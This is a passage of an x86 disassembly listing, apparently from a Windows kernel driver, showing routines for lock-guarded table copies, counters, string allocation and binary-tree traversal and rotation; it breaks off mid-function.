   10e8b:	int3   
   10e8c:	int3   
   10e8d:	int3   
   10e8e:	int3   
   10e8f:	int3   
   10e90:	mov    edi,edi
   10e92:	push   ebp
   10e93:	mov    ebp,esp
   10e95:	push   ebx
   10e96:	xor    eax,eax
   10e98:	push   eax
   10e99:	push   eax
   10e9a:	push   eax
   10e9b:	push   eax
   10e9c:	mov    ebx,0x7e534
   10ea1:	push   ebx
   10ea2:	call   DWORD PTR ds:0x1f028
   10ea8:	test   eax,eax
   10eaa:	jge    0x10eb0
   10eac:	xor    al,al
   10eae:	jmp    0x10ed3
   10eb0:	push   esi
   10eb1:	mov    esi,DWORD PTR [ebp+0x8]
   10eb4:	push   edi
   10eb5:	imul   esi,esi,0x14
   10eb8:	mov    edi,DWORD PTR [ebp+0xc]
   10ebb:	push   0x5
   10ebd:	pop    ecx
   10ebe:	push   0x0
   10ec0:	add    esi,0x7ef84
   10ec6:	push   ebx
   10ec7:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10ec9:	call   DWORD PTR ds:0x1f024
   10ecf:	pop    edi
   10ed0:	mov    al,0x1
   10ed2:	pop    esi
   10ed3:	pop    ebx
   10ed4:	pop    ebp
   10ed5:	ret    0x8
   10ed8:	int3   
   10ed9:	int3   
   10eda:	int3   
   10edb:	int3   
   10edc:	int3   
   10edd:	int3   
   10ede:	mov    edi,edi
   10ee0:	push   ebp
   10ee1:	mov    ebp,esp
   10ee3:	push   ebx
   10ee4:	xor    eax,eax
   10ee6:	push   eax
   10ee7:	push   eax
   10ee8:	push   eax
   10ee9:	push   eax
   10eea:	mov    ebx,0x7e534
   10eef:	push   ebx
   10ef0:	call   DWORD PTR ds:0x1f028
   10ef6:	test   eax,eax
   10ef8:	jl     0x10f1b
   10efa:	push   esi
   10efb:	mov    esi,DWORD PTR [ebp+0xc]
   10efe:	push   edi
   10eff:	mov    edi,DWORD PTR [ebp+0x8]
   10f02:	imul   edi,edi,0x14
   10f05:	push   0x5
   10f07:	pop    ecx
   10f08:	push   0x0
   10f0a:	add    edi,0x7ef84
   10f10:	push   ebx
   10f11:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10f13:	call   DWORD PTR ds:0x1f024
   10f19:	pop    edi
   10f1a:	pop    esi
   10f1b:	pop    ebx
   10f1c:	pop    ebp
   10f1d:	ret    0x8
   10f20:	int3   
   10f21:	int3   
   10f22:	int3   
   10f23:	int3   
   10f24:	int3   
   10f25:	int3   
   10f26:	mov    edi,edi
   10f28:	push   ebp
   10f29:	mov    ebp,esp
   10f2b:	sub    esp,0x14
   10f2e:	and    DWORD PTR [ebp-0x14],0x0
   10f32:	push   edi
   10f33:	xor    eax,eax
   10f35:	lea    edi,[ebp-0x10]
   10f38:	stos   DWORD PTR es:[edi],eax
   10f39:	stos   DWORD PTR es:[edi],eax
   10f3a:	stos   DWORD PTR es:[edi],eax
   10f3b:	stos   DWORD PTR es:[edi],eax
   10f3c:	lea    eax,[ebp-0x14]
   10f3f:	push   eax
   10f40:	push   DWORD PTR [ebp+0x8]
   10f43:	call   0x10ede
   10f48:	pop    edi
   10f49:	leave  
   10f4a:	ret    0x4
   10f4d:	int3   
   10f4e:	int3   
   10f4f:	int3   
   10f50:	int3   
   10f51:	int3   
   10f52:	mov    edi,edi
   10f54:	push   ebp
   10f55:	mov    ebp,esp
   10f57:	push   ebx
   10f58:	xor    eax,eax
   10f5a:	push   eax
   10f5b:	push   eax
   10f5c:	push   eax
   10f5d:	push   eax
   10f5e:	mov    ebx,0x7eec0
   10f63:	push   ebx
   10f64:	call   DWORD PTR ds:0x1f028
   10f6a:	test   eax,eax
   10f6c:	jl     0x10f88
   10f6e:	push   esi
   10f6f:	mov    esi,DWORD PTR [ebp+0x8]
   10f72:	push   edi
   10f73:	push   0x40
   10f75:	pop    ecx
   10f76:	push   0x0
   10f78:	mov    edi,0x7efb0
   10f7d:	push   ebx
   10f7e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10f80:	call   DWORD PTR ds:0x1f024
   10f86:	pop    edi
   10f87:	pop    esi
   10f88:	pop    ebx
   10f89:	pop    ebp
   10f8a:	ret    0x4
   10f8d:	int3   
   10f8e:	int3   
   10f8f:	int3   
   10f90:	int3   
   10f91:	int3   
   10f92:	mov    edi,edi
   10f94:	push   ebp
   10f95:	mov    ebp,esp
   10f97:	push   ebx
   10f98:	xor    eax,eax
   10f9a:	push   eax
   10f9b:	push   eax
   10f9c:	push   eax
   10f9d:	push   eax
   10f9e:	mov    ebx,0x7eec0
   10fa3:	push   ebx
   10fa4:	call   DWORD PTR ds:0x1f028
   10faa:	test   eax,eax
   10fac:	jge    0x10fb2
   10fae:	xor    al,al
   10fb0:	jmp    0x10fd8
   10fb2:	push   esi
   10fb3:	push   edi
   10fb4:	mov    edi,DWORD PTR [ebp+0x8]
   10fb7:	push   0x40
   10fb9:	pop    ecx
   10fba:	push   0x0
   10fbc:	mov    esi,0x7efb0
   10fc1:	push   ebx
   10fc2:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   10fc4:	call   DWORD PTR ds:0x1f024
   10fca:	xor    eax,eax
   10fcc:	cmp    WORD PTR ds:0x7efb0,ax
   10fd3:	pop    edi
   10fd4:	setne  al
   10fd7:	pop    esi
   10fd8:	pop    ebx
   10fd9:	pop    ebp
   10fda:	ret    0x4
   10fdd:	int3   
   10fde:	int3   
   10fdf:	int3   
   10fe0:	int3   
   10fe1:	int3   
   10fe2:	mov    edi,edi
   10fe4:	push   ebp
   10fe5:	mov    ebp,esp
   10fe7:	push   ebx
   10fe8:	mov    ebx,DWORD PTR [ebp+0x8]
   10feb:	cmp    ebx,0x40
   10fee:	ja     0x1101b
   10ff0:	push   esi
   10ff1:	push   edi
   10ff2:	xor    edi,edi
   10ff4:	push   edi
   10ff5:	push   edi
   10ff6:	push   edi
   10ff7:	push   edi
   10ff8:	mov    esi,0x7eefc
   10ffd:	push   esi
   10ffe:	call   DWORD PTR ds:0x1f028
   11004:	test   eax,eax
   11006:	jl     0x11019
   11008:	push   edi
   11009:	lea    eax,[ebx*4+0x7e5c0]
   11010:	inc    DWORD PTR [eax]
   11012:	push   esi
   11013:	call   DWORD PTR ds:0x1f024
   11019:	pop    edi
   1101a:	pop    esi
   1101b:	pop    ebx
   1101c:	pop    ebp
   1101d:	ret    0x4
   11020:	int3   
   11021:	int3   
   11022:	int3   
   11023:	int3   
   11024:	int3   
   11025:	int3   
   11026:	mov    edi,edi
   11028:	push   ebp
   11029:	mov    ebp,esp
   1102b:	push   ebx
   1102c:	push   esi
   1102d:	push   edi
   1102e:	mov    edi,DWORD PTR [ebp+0x8]
   11031:	cmp    edi,0x40
   11034:	ja     0x1105f
   11036:	xor    ebx,ebx
   11038:	push   ebx
   11039:	push   ebx
   1103a:	push   ebx
   1103b:	push   ebx
   1103c:	mov    esi,0x7eefc
   11041:	push   esi
   11042:	call   DWORD PTR ds:0x1f028
   11048:	test   eax,eax
   1104a:	jl     0x1105f
   1104c:	mov    edi,DWORD PTR [edi*4+0x7e5c0]
   11053:	push   ebx
   11054:	push   esi
   11055:	call   DWORD PTR ds:0x1f024
   1105b:	mov    eax,edi
   1105d:	jmp    0x11061
   1105f:	xor    eax,eax
   11061:	pop    edi
   11062:	pop    esi
   11063:	pop    ebx
   11064:	pop    ebp
   11065:	ret    0x4
   11068:	int3   
   11069:	int3   
   1106a:	int3   
   1106b:	int3   
   1106c:	int3   
   1106d:	int3   
   1106e:	mov    edi,edi
   11070:	push   ebp
   11071:	mov    ebp,esp
   11073:	push   esi
   11074:	mov    esi,DWORD PTR [ebp+0x8]
   11077:	push   edi
   11078:	push   DWORD PTR [esi]
   1107a:	call   0x10a52
   1107f:	push   DWORD PTR [esi]
   11081:	mov    edi,eax
   11083:	push   esi
   11084:	push   edi
   11085:	call   0x1dac6
   1108a:	add    esp,0x10
   1108d:	mov    eax,edi
   1108f:	pop    edi
   11090:	pop    esi
   11091:	pop    ebp
   11092:	ret    0x4
   11095:	int3   
   11096:	int3   
   11097:	int3   
   11098:	int3   
   11099:	int3   
   1109a:	mov    edi,edi
   1109c:	push   esi
   1109d:	mov    esi,ecx
   1109f:	push   DWORD PTR [esi+0x8]
   110a2:	call   0x10a86
   110a7:	push   DWORD PTR [esi]
   110a9:	call   0x10a86
   110ae:	pop    ecx
   110af:	pop    ecx
   110b0:	pop    esi
   110b1:	ret    
   110b2:	int3   
   110b3:	int3   
   110b4:	int3   
   110b5:	int3   
   110b6:	int3   
   110b7:	int3   
   110b8:	mov    edi,edi
   110ba:	push   ebp
   110bb:	mov    ebp,esp
   110bd:	push   esi
   110be:	mov    esi,DWORD PTR [ebp+0xc]
   110c1:	push   edi
   110c2:	mov    edi,ecx
   110c4:	cmp    esi,0xffffffff
   110c7:	jne    0x110d8
   110c9:	mov    esi,DWORD PTR [ebp+0x8]
   110cc:	lea    ecx,[esi+0x1]
   110cf:	mov    al,BYTE PTR [esi]
   110d1:	inc    esi
   110d2:	test   al,al
   110d4:	jne    0x110cf
   110d6:	sub    esi,ecx
   110d8:	lea    eax,[esi+0x1]
   110db:	push   eax
   110dc:	call   0x10a52
   110e1:	pop    ecx
   110e2:	mov    DWORD PTR [edi],eax
   110e4:	test   eax,eax
   110e6:	jne    0x110f3
   110e8:	push   0xc000009a
   110ed:	call   DWORD PTR ds:0x1f014
   110f3:	mov    eax,DWORD PTR [edi]
   110f5:	push   esi
   110f6:	push   DWORD PTR [ebp+0x8]
   110f9:	mov    BYTE PTR [esi+eax*1],0x0
   110fd:	push   DWORD PTR [edi]
   110ff:	call   0x1dac6
   11104:	add    esp,0xc
   11107:	mov    DWORD PTR [edi+0x4],esi
   1110a:	pop    edi
   1110b:	pop    esi
   1110c:	pop    ebp
   1110d:	ret    0x8
   11110:	int3   
   11111:	int3   
   11112:	int3   
   11113:	int3   
   11114:	int3   
   11115:	int3   
   11116:	mov    edi,edi
   11118:	push   ebp
   11119:	mov    ebp,esp
   1111b:	mov    eax,DWORD PTR [ebp+0x8]
   1111e:	mov    edx,DWORD PTR [ebp+0xc]
   11121:	push   esi
   11122:	xor    esi,esi
   11124:	jmp    0x11149
   11126:	mov    ecx,eax
   11128:	and    ecx,0x1
   1112b:	or     ecx,esi
   1112d:	push   esi
   1112e:	jne    0x1113b
   11130:	push   0x2
   11132:	push   edx
   11133:	push   eax
   11134:	call   0x1daa2
   11139:	jmp    0x11149
   1113b:	push   0x3
   1113d:	push   edx
   1113e:	push   eax
   1113f:	call   0x1da96
   11144:	add    eax,0x1
   11147:	adc    edx,esi
   11149:	cmp    eax,0x4
   1114c:	jne    0x11126
   1114e:	cmp    edx,esi
   11150:	jne    0x11126
   11152:	pop    esi
   11153:	pop    ebp
   11154:	ret    0x8
   11157:	int3   
   11158:	int3   
   11159:	int3   
   1115a:	int3   
   1115b:	int3   
   1115c:	mov    edi,edi
   1115e:	push   ebp
   1115f:	mov    ebp,esp
   11161:	push   esi
   11162:	push   edi
   11163:	mov    edi,DWORD PTR [ebp+0xc]
   11166:	mov    esi,ecx
   11168:	cmp    edi,0xffffffff
   1116b:	jne    0x11177
   1116d:	push   DWORD PTR [ebp+0x8]
   11170:	call   0x109ac
   11175:	mov    edi,eax
   11177:	xor    ecx,ecx
   11179:	push   0x2
   1117b:	pop    edx
   1117c:	lea    eax,[edi+0x1]
   1117f:	mul    edx
   11181:	seto   cl
   11184:	neg    ecx
   11186:	or     ecx,eax
   11188:	push   ecx
   11189:	call   0x10a52
   1118e:	pop    ecx
   1118f:	mov    DWORD PTR [esi],eax
   11191:	test   eax,eax
   11193:	jne    0x111a0
   11195:	push   0xc000009a
   1119a:	call   DWORD PTR ds:0x1f014
   111a0:	mov    ecx,DWORD PTR [esi]
   111a2:	lea    eax,[edi+edi*1]
   111a5:	push   eax
   111a6:	push   DWORD PTR [ebp+0x8]
   111a9:	xor    edx,edx
   111ab:	mov    WORD PTR [eax+ecx*1],dx
   111af:	push   DWORD PTR [esi]
   111b1:	call   0x1dac6
   111b6:	add    esp,0xc
   111b9:	mov    DWORD PTR [esi+0x4],edi
   111bc:	pop    edi
   111bd:	pop    esi
   111be:	pop    ebp
   111bf:	ret    0x8
   111c2:	int3   
   111c3:	int3   
   111c4:	int3   
   111c5:	int3   
   111c6:	int3   
   111c7:	int3   
   111c8:	mov    edi,edi
   111ca:	push   ebp
   111cb:	mov    ebp,esp
   111cd:	mov    eax,DWORD PTR [ebp+0x8]
   111d0:	mov    edx,DWORD PTR ds:0x7f8b8
   111d6:	jmp    0x111da
   111d8:	mov    eax,ecx
   111da:	mov    ecx,DWORD PTR [eax+0x8]
   111dd:	cmp    ecx,edx
   111df:	jne    0x111d8
   111e1:	pop    ebp
   111e2:	ret    0x4
   111e5:	int3   
   111e6:	int3   
   111e7:	int3   
   111e8:	int3   
   111e9:	int3   
   111ea:	mov    edi,edi
   111ec:	push   ebp
   111ed:	mov    ebp,esp
   111ef:	mov    eax,DWORD PTR [ebp+0x8]
   111f2:	mov    edx,DWORD PTR ds:0x7f8b8
   111f8:	jmp    0x111fc
   111fa:	mov    eax,ecx
   111fc:	mov    ecx,DWORD PTR [eax]
   111fe:	cmp    ecx,edx
   11200:	jne    0x111fa
   11202:	pop    ebp
   11203:	ret    0x4
   11206:	int3   
   11207:	int3   
   11208:	int3   
   11209:	int3   
   1120a:	int3   
   1120b:	int3   
   1120c:	mov    edi,edi
   1120e:	push   ebp
   1120f:	mov    ebp,esp
   11211:	mov    eax,DWORD PTR [ebp+0x8]
   11214:	mov    edx,DWORD PTR ds:0x7f8bc
   1121a:	jmp    0x1121e
   1121c:	mov    eax,ecx
   1121e:	mov    ecx,DWORD PTR [eax+0x8]
   11221:	cmp    ecx,edx
   11223:	jne    0x1121c
   11225:	pop    ebp
   11226:	ret    0x4
   11229:	int3   
   1122a:	int3   
   1122b:	int3   
   1122c:	int3   
   1122d:	int3   
   1122e:	mov    edi,edi
   11230:	push   ebp
   11231:	mov    ebp,esp
   11233:	mov    eax,DWORD PTR [ebp+0x8]
   11236:	mov    edx,DWORD PTR ds:0x7f8bc
   1123c:	jmp    0x11240
   1123e:	mov    eax,ecx
   11240:	mov    ecx,DWORD PTR [eax]
   11242:	cmp    ecx,edx
   11244:	jne    0x1123e
   11246:	pop    ebp
   11247:	ret    0x4
   1124a:	int3   
   1124b:	int3   
   1124c:	int3   
   1124d:	int3   
   1124e:	int3   
   1124f:	int3   
   11250:	mov    edi,edi
   11252:	push   ebp
   11253:	mov    ebp,esp
   11255:	mov    eax,DWORD PTR [ebp+0x8]
   11258:	mov    edx,DWORD PTR ds:0x7f8c0
   1125e:	jmp    0x11262
   11260:	mov    eax,ecx
   11262:	mov    ecx,DWORD PTR [eax+0x8]
   11265:	cmp    ecx,edx
   11267:	jne    0x11260
   11269:	pop    ebp
   1126a:	ret    0x4
   1126d:	int3   
   1126e:	int3   
   1126f:	int3   
   11270:	int3   
   11271:	int3   
   11272:	mov    edi,edi
   11274:	push   ebp
   11275:	mov    ebp,esp
   11277:	mov    eax,DWORD PTR [ebp+0x8]
   1127a:	mov    edx,DWORD PTR ds:0x7f8c0
   11280:	jmp    0x11284
   11282:	mov    eax,ecx
   11284:	mov    ecx,DWORD PTR [eax]
   11286:	cmp    ecx,edx
   11288:	jne    0x11282
   1128a:	pop    ebp
   1128b:	ret    0x4
   1128e:	int3   
   1128f:	int3   
   11290:	int3   
   11291:	int3   
   11292:	int3   
   11293:	int3   
   11294:	mov    edi,edi
   11296:	push   esi
   11297:	mov    esi,ecx
   11299:	mov    ecx,DWORD PTR [esi]
   1129b:	cmp    DWORD PTR [ecx+0x14],0x0
   1129f:	jne    0x112ae
   112a1:	mov    eax,DWORD PTR [ecx+0x4]
   112a4:	cmp    DWORD PTR [eax+0x4],ecx
   112a7:	jne    0x112ae
   112a9:	mov    eax,DWORD PTR [ecx+0x8]
   112ac:	jmp    0x112cb
   112ae:	mov    eax,DWORD PTR [ecx]
   112b0:	cmp    eax,DWORD PTR ds:0x7f8b8
   112b6:	je     0x112c4
   112b8:	push   eax
   112b9:	call   0x111c8
   112be:	jmp    0x112cb
   112c0:	mov    DWORD PTR [esi],eax
   112c2:	mov    ecx,eax
   112c4:	mov    eax,DWORD PTR [ecx+0x4]
   112c7:	cmp    ecx,DWORD PTR [eax]
   112c9:	je     0x112c0
   112cb:	mov    DWORD PTR [esi],eax
   112cd:	pop    esi
   112ce:	ret    
   112cf:	int3   
   112d0:	int3   
   112d1:	int3   
   112d2:	int3   
   112d3:	int3   
   112d4:	mov    edi,edi
   112d6:	push   esi
   112d7:	mov    esi,ecx
   112d9:	mov    ecx,DWORD PTR [esi]
   112db:	mov    eax,DWORD PTR [ecx+0x8]
   112de:	cmp    eax,DWORD PTR ds:0x7f8b8
   112e4:	je     0x112f2
   112e6:	push   eax
   112e7:	call   0x111ea
   112ec:	jmp    0x11301
   112ee:	mov    DWORD PTR [esi],eax
   112f0:	mov    ecx,eax
   112f2:	mov    eax,DWORD PTR [ecx+0x4]
   112f5:	cmp    ecx,DWORD PTR [eax+0x8]
   112f8:	je     0x112ee
   112fa:	mov    ecx,DWORD PTR [esi]
   112fc:	cmp    DWORD PTR [ecx+0x8],eax
   112ff:	je     0x11303
   11301:	mov    DWORD PTR [esi],eax
   11303:	pop    esi
   11304:	ret    
   11305:	int3   
   11306:	int3   
   11307:	int3   
   11308:	int3   
   11309:	int3   
   1130a:	mov    edi,edi
   1130c:	push   ebp
   1130d:	mov    ebp,esp
   1130f:	mov    edx,DWORD PTR [ebp+0x8]
   11312:	mov    eax,DWORD PTR [edx+0x8]
   11315:	push   esi
   11316:	mov    esi,DWORD PTR [eax]
   11318:	mov    DWORD PTR [edx+0x8],esi
   1131b:	mov    esi,DWORD PTR [eax]
   1131d:	cmp    esi,DWORD PTR ds:0x7f8c4
   11323:	je     0x11328
   11325:	mov    DWORD PTR [esi+0x4],edx
   11328:	mov    esi,DWORD PTR [edx+0x4]
   1132b:	mov    DWORD PTR [eax+0x4],esi
   1132e:	mov    ecx,DWORD PTR [ecx+0x4]
   11331:	pop    esi
   11332:	cmp    edx,DWORD PTR [ecx+0x4]
   11335:	jne    0x1133c
   11337:	mov    DWORD PTR [ecx+0x4],eax
   1133a:	jmp    0x1134a
   1133c:	mov    ecx,DWORD PTR [edx+0x4]
   1133f:	cmp    edx,DWORD PTR [ecx]
   11341:	jne    0x11347
   11343:	mov    DWORD PTR [ecx],eax
   11345:	jmp    0x1134a
   11347:	mov    DWORD PTR [ecx+0x8],eax
   1134a:	mov    DWORD PTR [eax],edx
   1134c:	mov    DWORD PTR [edx+0x4],eax
   1134f:	pop    ebp
   11350:	ret    0x4
   11353:	int3   
   11354:	int3   
   11355:	int3   
   11356:	int3   
   11357:	int3   
   11358:	mov    edi,edi
   1135a:	push   ebp
   1135b:	mov    ebp,esp
   1135d:	mov    eax,DWORD PTR [ebp+0x8]
   11360:	mov    edx,DWORD PTR ds:0x7f8c4
   11366:	jmp    0x1136a
   11368:	mov    eax,ecx
   1136a:	mov    ecx,DWORD PTR [eax+0x8]
   1136d:	cmp    ecx,edx
   1136f:	jne    0x11368
   11371:	pop    ebp
   11372:	ret    0x4
   11375:	int3   
   11376:	int3   
   11377:	int3   
   11378:	int3   
   11379:	int3   
   1137a:	mov    edi,edi
   1137c:	push   ebp
   1137d:	mov    ebp,esp
   1137f:	mov    edx,DWORD PTR [ebp+0x8]
   11382:	mov    eax,DWORD PTR [edx]
   11384:	push   esi
   11385:	mov    esi,DWORD PTR [eax+0x8]
   11388:	mov    DWORD PTR [edx],esi
   1138a:	mov    esi,DWORD PTR [eax+0x8]
   1138d:	cmp    esi,DWORD PTR ds:0x7f8c4
   11393:	je     0x11398
   11395:	mov    DWORD PTR [esi+0x4],edx
   11398:	mov    esi,DWORD PTR [edx+0x4]
   1139b:	mov    DWORD PTR [eax+0x4],esi
   1139e:	mov    ecx,DWORD PTR [ecx+0x4]
   113a1:	pop    esi
   113a2:	cmp    edx,DWORD PTR [ecx+0x4]
   113a5:	jne    0x113ac
   113a7:	mov    DWORD PTR [ecx+0x4],eax
   113aa:	jmp    0x113bb
   113ac:	mov    ecx,DWORD PTR [edx+0x4]
   113af:	cmp    edx,DWORD PTR [ecx+0x8]
   113b2:	jne    0x113b9
   113b4:	mov    DWORD PTR [ecx+0x8],eax
   113b7:	jmp    0x113bb
   113b9:	mov    DWORD PTR [ecx],eax
   113bb:	mov    DWORD PTR [eax+0x8],edx
   113be:	mov    DWORD PTR [edx+0x4],eax
   113c1:	pop    ebp
   113c2:	ret    0x4
   113c5:	int3   
   113c6:	int3   
   113c7:	int3   
   113c8:	int3   
   113c9:	int3   
   113ca:	mov    edi,edi
   113cc:	push   esi
   113cd:	mov    esi,ecx
   113cf:	mov    ecx,DWORD PTR [esi]
   113d1:	cmp    DWORD PTR [ecx+0x68],0x0
   113d5:	jne    0x113e4
   113d7:	mov    eax,DWORD PTR [ecx+0x4]
   113da:	cmp    DWORD PTR [eax+0x4],ecx
   113dd:	jne    0x113e4
   113df:	mov    eax,DWORD PTR [ecx+0x8]
   113e2:	jmp    0x11401
   113e4:	mov    eax,DWORD PTR [ecx]
   113e6:	cmp    eax,DWORD PTR ds:0x7f8c4
   113ec:	je     0x113fa
   113ee:	push   eax
   113ef:	call   0x11358
   113f4:	jmp    0x11401
   113f6:	mov    DWORD PTR [esi],eax
   113f8:	mov    ecx,eax
   113fa:	mov    eax,DWORD PTR [ecx+0x4]
   113fd:	cmp    ecx,DWORD PTR [eax]
   113ff:	je     0x113f6
   11401:	mov    DWORD PTR [esi],eax
   11403:	pop    esi
   11404:	ret    
   11405:	int3   
   11406:	int3   
   11407:	int3   
   11408:	int3   
   11409:	int3   
   1140a:	mov    edi,edi
   1140c:	push   ebp
   1140d:	mov    ebp,esp
   1140f:	mov    eax,DWORD PTR [ebp+0x8]
   11412:	mov    edx,DWORD PTR ds:0x7f8c8
   11418:	jmp    0x1141c
   1141a:	mov    eax,ecx
   1141c:	mov    ecx,DWORD PTR [eax+0x8]
   1141f:	cmp    ecx,edx
   11421:	jne    0x1141a
   11423:	pop    ebp
   11424:	ret    0x4
   11427:	int3   
   11428:	int3   
   11429:	int3   
   1142a:	int3   
   1142b:	int3   
   1142c:	mov    edi,edi
   1142e:	push   ebp
   1142f:	mov    ebp,esp
   11431:	mov    eax,DWORD PTR [ebp+0x8]
   11434:	mov    edx,DWORD PTR ds:0x7f8c8
   1143a:	jmp    0x1143e
   1143c:	mov    eax,ecx
   1143e:	mov    ecx,DWORD PTR [eax]
   11440:	cmp    ecx,edx
   11442:	jne    0x1143c
   11444:	pop    ebp
   11445:	ret    0x4
   11448:	int3   
   11449:	int3   
   1144a:	int3   
   1144b:	int3   
   1144c:	int3   
   1144d:	int3   
   1144e:	mov    edi,edi
   11450:	push   esi
   11451:	mov    esi,ecx
   11453:	mov    ecx,DWORD PTR [esi]
   11455:	cmp    DWORD PTR [ecx+0x1c],0x0
   11459:	jne    0x11468
   1145b:	mov    eax,DWORD PTR [ecx+0x4]
   1145e:	cmp    DWORD PTR [eax+0x4],ecx
   11461:	jne    0x11468
   11463:	mov    eax,DWORD PTR [ecx+0x8]
   11466:	jmp    0x11485
   11468:	mov    eax,DWORD PTR [ecx]
   1146a:	cmp    eax,DWORD PTR ds:0x7f8c8
   11470:	je     0x1147e
   11472:	push   eax
   11473:	call   0x1140a
   11478:	jmp    0x11485
   1147a:	mov    DWORD PTR [esi],eax
   1147c:	mov    ecx,eax
   1147e:	mov    eax,DWORD PTR [ecx+0x4]
   11481:	cmp    ecx,DWORD PTR [eax]
   11483:	je     0x1147a
   11485:	mov    DWORD PTR [esi],eax
   11487:	pop    esi
   11488:	ret    
   11489:	int3   
   1148a:	int3   
   1148b:	int3   
   1148c:	int3   
   1148d:	int3   
   1148e:	mov    edi,edi
   11490:	push   ebp
   11491:	mov    ebp,esp
   11493:	mov    eax,DWORD PTR [ebp+0x8]
   11496:	mov    edx,DWORD PTR ds:0x7f8cc
   1149c:	jmp    0x114a0
   1149e:	mov    eax,ecx
   114a0:	mov    ecx,DWORD PTR [eax+0x8]
   114a3:	cmp    ecx,edx
   114a5:	jne    0x1149e
   114a7:	pop    ebp
   114a8:	ret    0x4
   114ab:	int3   
   114ac:	int3   
   114ad:	int3   
   114ae:	int3   
   114af:	int3   
   114b0:	mov    edi,edi
   114b2:	push   ebp
   114b3:	mov    ebp,esp
   114b5:	mov    eax,DWORD PTR [ebp+0x8]
   114b8:	mov    edx,DWORD PTR ds:0x7f8cc
   114be:	jmp    0x114c2
   114c0:	mov    eax,ecx
   114c2:	mov    ecx,DWORD PTR [eax]
   114c4:	cmp    ecx,edx
   114c6:	jne    0x114c0
   114c8:	pop    ebp
   114c9:	ret    0x4
   114cc:	int3   
   114cd:	int3   
   114ce:	int3   
   114cf:	int3   
   114d0:	int3   
   114d1:	int3   
   114d2:	mov    edi,edi
   114d4:	push   esi
   114d5:	mov    esi,ecx
   114d7:	mov    ecx,DWORD PTR [esi]
   114d9:	cmp    DWORD PTR [ecx+0x14],0x0
   114dd:	jne    0x114ec
   114df:	mov    eax,DWORD PTR [ecx+0x4]
   114e2:	cmp    DWORD PTR [eax+0x4],ecx
   114e5:	jne    0x114ec
   114e7:	mov    eax,DWORD PTR [ecx+0x8]
   114ea:	jmp    0x11509
   114ec:	mov    eax,DWORD PTR [ecx]
   114ee:	cmp    eax,DWORD PTR ds:0x7f8cc
   114f4:	je     0x11502
   114f6:	push   eax
   114f7:	call   0x1148e
   114fc:	jmp    0x11509
   114fe:	mov    DWORD PTR [esi],eax
   11500:	mov    ecx,eax
   11502:	mov    eax,DWORD PTR [ecx+0x4]
   11505:	cmp    ecx,DWORD PTR [eax]
   11507:	je     0x114fe
   11509:	mov    DWORD PTR [esi],eax
   1150b:	pop    esi
   1150c:	ret    
   1150d:	int3   
   1150e:	int3   
   1150f:	int3   
   11510:	int3   
   11511:	int3   
   11512:	mov    edi,edi
   11514:	push   esi
   11515:	mov    esi,ecx
   11517:	mov    ecx,DWORD PTR [esi]
   11519:	cmp    DWORD PTR [ecx+0x70],0x0
   1151d:	jne    0x1152c
   1151f:	mov    eax,DWORD PTR [ecx+0x4]
   11522:	cmp    DWORD PTR [eax+0x4],ecx
   11525:	jne    0x1152c
   11527:	mov    eax,DWORD PTR [ecx+0x8]
   1152a:	jmp    0x11549
   1152c:	mov    eax,DWORD PTR [ecx]
   1152e:	cmp    eax,DWORD PTR ds:0x7f8c0
   11534:	je     0x11542
   11536:	push   eax
   11537:	call   0x11250
   1153c:	jmp    0x11549
   1153e:	mov    DWORD PTR [esi],eax
   11540:	mov    ecx,eax
   11542:	mov    eax,DWORD PTR [ecx+0x4]
   11545:	cmp    ecx,DWORD PTR [eax]
   11547:	je     0x1153e
   11549:	mov    DWORD PTR [esi],eax
   1154b:	pop    esi
   1154c:	ret    
   1154d:	int3   
   1154e:	int3   
   1154f:	int3   
   11550:	int3   
   11551:	int3   
   11552:	mov    edi,edi
   11554:	push   esi
   11555:	mov    esi,ecx
   11557:	mov    ecx,DWORD PTR [esi]
   11559:	mov    eax,DWORD PTR [ecx+0x8]
   1155c:	cmp    eax,DWORD PTR ds:0x7f8c8
   11562:	je     0x11570
   11564:	push   eax
   11565:	call   0x1142c
   1156a:	jmp    0x1157f
   1156c:	mov    DWORD PTR [esi],eax
   1156e:	mov    ecx,eax
   11570:	mov    eax,DWORD PTR [ecx+0x4]
   11573:	cmp    ecx,DWORD PTR [eax+0x8]
   11576:	je     0x1156c
   11578:	mov    ecx,DWORD PTR [esi]
   1157a:	cmp    DWORD PTR [ecx+0x8],eax
   1157d:	je     0x11581
   1157f:	mov    DWORD PTR [esi],eax
   11581:	pop    esi
   11582:	ret    
   11583:	int3   
   11584:	int3   
   11585:	int3   
   11586:	int3   
   11587:	int3   
   11588:	mov    edi,edi
   1158a:	push   esi
   1158b:	mov    esi,ecx
   1158d:	mov    ecx,DWORD PTR [esi]
   1158f:	mov    eax,DWORD PTR [ecx+0x8]
   11592:	cmp    eax,DWORD PTR ds:0x7f8cc
   11598:	je     0x115a6
   1159a:	push   eax
   1159b:	call   0x114b0
   115a0:	jmp    0x115b5
   115a2:	mov    DWORD PTR [esi],eax
   115a4:	mov    ecx,eax
   115a6:	mov    eax,DWORD PTR [ecx+0x4]
   115a9:	cmp    ecx,DWORD PTR [eax+0x8]
   115ac:	je     0x115a2
   115ae:	mov    ecx,DWORD PTR [esi]
   115b0:	cmp    DWORD PTR [ecx+0x8],eax
   115b3:	je     0x115b7
   115b5:	mov    DWORD PTR [esi],eax
   115b7:	pop    esi
   115b8:	ret    
   115b9:	int3   
   115ba:	int3   
   115bb:	int3   
   115bc:	int3   
   115bd:	int3   
   115be:	mov    edi,edi
   115c0:	push   ebp
   115c1:	mov    ebp,esp
   115c3:	mov    eax,DWORD PTR [ebp+0x8]
   115c6:	mov    edx,DWORD PTR ds:0x7f8d4
   115cc:	jmp    0x115d0
   115ce:	mov    eax,ecx
   115d0:	mov    ecx,DWORD PTR [eax+0x8]
   115d3:	cmp    ecx,edx
   115d5:	jne    0x115ce
   115d7:	pop    ebp
   115d8:	ret    0x4
   115db:	int3   
   115dc:	int3   
   115dd:	int3   
   115de:	int3   
   115df:	int3   
   115e0:	mov    edi,edi
   115e2:	push   ebp
   115e3:	mov    ebp,esp
   115e5:	push   ecx
   115e6:	push   ecx
   115e7:	mov    eax,DWORD PTR [ebp+0x8]
   115ea:	mov    DWORD PTR [ebp-0x4],eax
   115ed:	lea    ecx,[eax+0x2]
   115f0:	mov    dx,WORD PTR [eax]
   115f3:	inc    eax
   115f4:	inc    eax
   115f5:	test   dx,dx
   115f8:	jne    0x115f0
